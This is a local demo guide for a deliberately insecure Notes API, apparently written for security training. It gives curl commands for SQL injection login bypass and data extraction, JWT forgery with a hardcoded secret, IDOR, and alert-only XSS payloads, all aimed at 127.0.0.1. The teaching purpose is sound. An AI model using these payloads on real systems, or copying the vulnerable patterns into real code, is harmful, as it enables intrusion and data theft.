# Insecure Notes API: Local Demo Guide

> **Warning:** This application is intentionally vulnerable. Run it only on a machine you control, keep it off public networks, and stop it when the demo ends. The commands below target `127.0.0.1` only. Do not point vulnerability scanners or these requests at systems you do not own or have explicit permission to test.

This guide demonstrates every intentionally insecure behavior in `vulnerable-demo/`, alongside the normal API flows that make the impact visible. It is designed for a disposable local demo: by default, the app stores its database in memory, so restarting it restores the seeded data.

## Contents

- [1. Start a disposable local instance](#1-start-a-disposable-local-instance)
- [2. Inspect the normal application surface](#2-inspect-the-normal-application-surface)
- [3. Authenticate as the seeded low-privilege user](#3-authenticate-as-the-seeded-low-privilege-user)
- [4. Demo the insecure behaviors](#4-demo-the-insecure-behaviors)
- [5. Stop and reset the demo](#5-stop-and-reset-the-demo)
- [6. Vulnerability coverage map](#6-vulnerability-coverage-map)

## 1. Start a disposable local instance

From the repository root, install the demo's dependencies and start it in a dedicated terminal:

```bash
cd vulnerable-demo
npm install
npm start
```

The default database is in memory. Each process start creates these demonstration accounts and notes:

| User | Email | Password | Role |
| --- | --- | --- | --- |
| Admin | `admin@example.com` | `admin123` | `admin` |
| Alice | `alice@example.com` | `Password123` | `user` |
| Bob | `bob@example.com` | `Password123` | `user` |

| Note ID | Owner | Title |
| --- | --- | --- |
| `1` | Admin | `Admin private note` |
| `2` | Alice | `Alice note` |
| `3` | Alice | `Stored XSS note` |

In a second terminal, set the base URL and confirm the server is running:

```bash
export DEMO_URL=http://127.0.0.1:4000
curl -fsS "$DEMO_URL/health"
```

Expected response:

```json
{"status":"running","service":"insecure-notes-demo","docs":"/api-docs","openapi":"/openapi.json"}
```

### Docker alternative

This keeps the published port restricted to the loopback interface:

```bash
docker build -t insecure-notes-demo:local ./vulnerable-demo
docker run --rm --name insecure-notes-demo -p 127.0.0.1:4000:4000 insecure-notes-demo:local
```

Use the same `DEMO_URL` commands below. Stop the container with `Ctrl-C` in its terminal.

## 2. Inspect the normal application surface

Open the landing page and interactive API documentation in a browser:

```text
http://127.0.0.1:4000/
http://127.0.0.1:4000/api-docs
```

The raw OpenAPI document is also available at:

```bash
curl -fsS "$DEMO_URL/openapi.json"
```

The landing page links to the purpose-built vulnerability demo routes. The sections below explain what each one proves.

### Use Swagger UI as the interactive demo surface

The **Vulnerability Demos** section now contains every API-level vulnerability demo. Some entries also appear under their functional tag (Authentication, Notes, or Health); that duplication is intentional, so the normal API organization and the security-training walkthrough are both easy to follow.

For each interactive request, click **Try it out**, choose the named example, then click **Execute**. The Swagger UI examples and this guide use the same inputs and seeded records:

| Guide step | Swagger UI operation and example |
| --- | --- |
| 4.1 Plaintext password / weak validation | `POST /api/auth/register` → **Weak validation and plaintext password** |
| 4.2 Forged identity | `GET /api/debug/users`, then use the guide's local token command and `GET /api/auth/me` |
| 4.3 SQLi extraction / 4.5 error disclosure | `GET /api/users` → **Extract all users** or **Verbose SQL error** |
| 4.4 SQLi login bypass | `POST /api/auth/login` → **SQL injection bypass (local demo only)** |
| 4.6–4.7 IDOR | Log in as Alice, click **Authorize** and paste her token, then use note ID `1` on `GET`, `PUT`, or `DELETE /api/notes/{id}` |
| 4.8 Stored XSS | `POST /api/notes` → **Stored XSS payload**, then `GET /notes/{id}/render` (or use seeded ID `3`) |
| 4.9 Reflected XSS | `GET /search` → **Reflected XSS payload** |
| 4.10 Insecure cookie | `GET /api/set-session`; inspect `Set-Cookie` in the response headers |
| 4.11–4.12 Missing headers / no rate limit | `GET /health`; use the shell commands below for header inspection and repeated requests |

The dependency demo in section 4.13 is intentionally terminal-only: it examines the local `package.json` and installed dependency tree rather than an HTTP endpoint.

## 3. Authenticate as the seeded low-privilege user

Log in as Alice. The command extracts her bearer token using Node, which is already required by the app:

```bash
export ALICE_TOKEN="$(
  curl -fsS -X POST "$DEMO_URL/api/auth/login" \
    -H 'Content-Type: application/json' \
    --data '{"email":"alice@example.com","password":"Password123"}' \
  | node -e 'let body = ""; process.stdin.on("data", c => { body += c; }); process.stdin.on("end", () => process.stdout.write(JSON.parse(body).token));'
)"

curl -fsS "$DEMO_URL/api/auth/me" \
  -H "Authorization: Bearer $ALICE_TOKEN"
```

The successful response identifies Alice as a normal `user`. Keep `ALICE_TOKEN` set for the authenticated examples.

## 4. Demo the insecure behaviors

### 4.1 Plaintext password storage and weak input validation

Register a malformed account. The API accepts an empty username, an invalid email, and an empty password because it does not validate any of them. It also echoes the plaintext password in the response.

```bash
curl -fsS -X POST "$DEMO_URL/api/auth/register" \
  -H 'Content-Type: application/json' \
  --data '{"username":"","email":"not-an-email","password":""}'
```

The returned `user.password` field is evidence that the secret is handled as normal application data. Confirm it is stored and exposed through the debug endpoint:

```bash
curl -fsS "$DEMO_URL/api/debug/users"
```

Look for the seeded passwords (`admin123`, `Password123`) and the account just created. A secure service would validate inputs, hash passwords, and never return them.

### 4.2 Hardcoded JWT secret and forged identity

The debug endpoint also discloses the hardcoded signing secret. A person who knows it can mint a valid token with arbitrary identity and role claims. Generate an admin-shaped token locally, then present it to the API:

```bash
export FORGED_ADMIN_TOKEN="$(
  (
    cd vulnerable-demo
    node -e "const jwt = require('jsonwebtoken'); console.log(jwt.sign({ id: 1, username: 'forged-admin', email: 'forged@example.com', role: 'admin' }, 'dev-notes-hardcoded-secret-12345', { expiresIn: '1h' }));"
  )
)"

curl -fsS "$DEMO_URL/api/auth/me" \
  -H "Authorization: Bearer $FORGED_ADMIN_TOKEN"
```

The API accepts the forged token and returns the attacker-controlled claims. This works because the signing key is embedded in the source and the application treats the signed payload as trustworthy.

### 4.3 SQL injection: extract every user from the unsafe lookup

The `id` query parameter is concatenated directly into a SQL query. Supply a boolean expression instead of a numeric ID:

```bash
curl -fsS --get "$DEMO_URL/api/users" \
  --data-urlencode 'id=1 OR 1=1'
```

The response includes the assembled SQL in `query` and returns all users instead of just user `1`.

### 4.4 SQL injection: bypass password verification

The login query is assembled by string interpolation. The following local-only request comments out the password check and logs in as the admin account without knowing its password:

```bash
curl -fsS -X POST "$DEMO_URL/api/auth/login" \
  -H 'Content-Type: application/json' \
  --data '{"email":"admin@example.com\u0027 -- ","password":"does-not-matter"}'
```

The response returns an admin user and token. The `\u0027` is JSON's representation of a single quote; the server receives `admin@example.com' -- `.

### 4.5 Verbose database error disclosure

Send an invalid unquoted SQL identifier. The error response leaks the raw query and SQLite's internal error detail:

```bash
curl -sS --get "$DEMO_URL/api/users" \
  --data-urlencode 'id=not_a_number'
```

Expect a `500` response with `query` and `details` fields. Other unsafe SQL paths, including registration, login, note creation, and note IDs, expose similar database messages on malformed input.

### 4.6 Broken access control (IDOR): read another user's private note

Alice should only be able to see her own notes. Request the seeded admin note (`1`) using Alice's valid low-privilege token:

```bash
curl -fsS "$DEMO_URL/api/notes/1" \
  -H "Authorization: Bearer $ALICE_TOKEN"
```

The API returns the admin's private note. The route checks that *someone* is authenticated but never checks that the note belongs to that person.

### 4.7 Broken access control (IDOR): modify and delete another user's note

These two commands intentionally change the disposable in-memory dataset. Run them near the end of the demo, then restart the app to restore the seed data.

```bash
curl -fsS -X PUT "$DEMO_URL/api/notes/1" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  --data '{"title":"Changed by Alice","content":"A normal user modified the admin note."}'

curl -fsS -X DELETE "$DEMO_URL/api/notes/1" \
  -H "Authorization: Bearer $ALICE_TOKEN"
```

Both operations succeed despite Alice not owning note `1`. This demonstrates the read, update, and delete variants of the same authorization flaw.

### 4.8 Unvalidated note input and stored XSS

The application stores note titles and contents without validation or output encoding. A seeded example is already present. Open this in a browser to execute the harmless local alert:

```text
http://127.0.0.1:4000/notes/3/render
```

The page runs `alert("stored-xss")` because the stored note content is inserted directly into the HTML response. You can also create a new payload as Alice, then open the returned note ID at `/notes/<id>/render`:

```bash
curl -fsS -X POST "$DEMO_URL/api/notes" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  --data '{"title":"Untrusted title","content":"<script>alert(\"new-stored-xss\")</script>"}'
```

Only visit these URLs in the isolated local demo browser session; do not reuse a browser profile containing real credentials.

### 4.9 Reflected XSS

The search page writes the `q` parameter straight into its HTML response. Open this URL in a browser:

```text
http://127.0.0.1:4000/search?q=%3Cscript%3Ealert(%27reflected-xss%27)%3C%2Fscript%3E
```

The alert executes immediately, without storing anything. For a non-executing inspection of the reflected markup, use:

```bash
curl -fsS --get "$DEMO_URL/search" \
  --data-urlencode 'q=<strong>unescaped input</strong>'
```

### 4.10 Insecure session cookie

Inspect the `Set-Cookie` response header:

```bash
curl -isS "$DEMO_URL/api/set-session"
```

It sets `demo_session=insecure-demo-session` without `HttpOnly`, `Secure`, or `SameSite` attributes. Those omissions make the cookie readable by browser scripts, eligible for transmission over an unencrypted connection, and more exposed to cross-site request risks.

### 4.11 Missing security headers

Inspect the response headers for the health route:

```bash
curl -isS "$DEMO_URL/health"
```

There is no Helmet middleware, so common defenses such as `Content-Security-Policy`, `X-Content-Type-Options`, and `X-Frame-Options` are absent. This also helps explain why the XSS examples execute.

### 4.12 No rate limiting

Issue more than 100 requests in quick succession and count the status codes:

```bash
for i in $(seq 1 105); do
  curl -sS -o /dev/null -w '%{http_code}\n' "$DEMO_URL/health"
done | sort | uniq -c
```

Expect all requests to receive `200`; there is no `429 Too Many Requests` response because the demo registers no rate-limiting middleware.

### 4.13 Outdated dependencies and the security pipeline

The demo intentionally pins old vulnerable dependency versions, including `lodash@4.17.11` and `jsonwebtoken@8.5.1`. Inspect the installed dependency tree and run npm's advisory check:

```bash
npm --prefix vulnerable-demo ls --depth=0
npm --prefix vulnerable-demo audit --omit=dev
```

Advisory results change over time, so do not expect a fixed number of findings. In CI, the dedicated [`vulnerable-notes-security.yml`](../.github/workflows/vulnerable-notes-security.yml) workflow also runs Gitleaks, Trivy filesystem/image scans, and an OWASP ZAP full scan; it records findings without failing the educational demo pipeline.

## 5. Stop and reset the demo

Press `Ctrl-C` in the terminal running the app or Docker container. Start it again to recreate the in-memory database with the original accounts and notes.

If you deliberately set `DB_FILE` to a filesystem path, remove only that disposable demo database when finished; otherwise it will preserve the mutations from the IDOR and stored-XSS steps.

## 6. Vulnerability coverage map

| Intentionally insecure behavior | Demo section | Relevant route(s) |
| --- | --- | --- |
| Plaintext password storage | [4.1](#41-plaintext-password-storage-and-weak-input-validation) | `POST /api/auth/register`, `GET /api/debug/users` |
| Hardcoded JWT secret / token forgery | [4.2](#42-hardcoded-jwt-secret-and-forged-identity) | `GET /api/debug/users`, `GET /api/auth/me` |
| SQL injection | [4.3](#43-sql-injection-extract-every-user-from-the-unsafe-lookup), [4.4](#44-sql-injection-bypass-password-verification) | `GET /api/users`, `POST /api/auth/login` |
| Verbose error disclosure | [4.5](#45-verbose-database-error-disclosure) | Unsafe database routes |
| IDOR / broken access control | [4.6](#46-broken-access-control-idor-read-another-users-private-note), [4.7](#47-broken-access-control-idor-modify-and-delete-another-users-note) | `GET`, `PUT`, `DELETE /api/notes/:id` |
| Weak input validation | [4.1](#41-plaintext-password-storage-and-weak-input-validation), [4.8](#48-unvalidated-note-input-and-stored-xss) | Registration and note creation |
| Stored XSS | [4.8](#48-unvalidated-note-input-and-stored-xss) | `POST /api/notes`, `GET /notes/:id/render` |
| Reflected XSS | [4.9](#49-reflected-xss) | `GET /search` |
| Insecure cookies | [4.10](#410-insecure-session-cookie) | `GET /api/set-session` |
| Missing security headers | [4.11](#411-missing-security-headers) | Any response, e.g. `GET /health` |
| No rate limiting | [4.12](#412-no-rate-limiting) | `GET /health` |
| Outdated dependencies | [4.13](#413-outdated-dependencies-and-the-security-pipeline) | `package.json`, security workflow |
| Sensitive debug-data exposure | [4.1](#41-plaintext-password-storage-and-weak-input-validation), [4.2](#42-hardcoded-jwt-secret-and-forged-identity) | `GET /api/debug/users` |

For the remediated equivalent of these behaviors, compare the secure API in the repository root (`src/`) and its test suite (`tests/`).
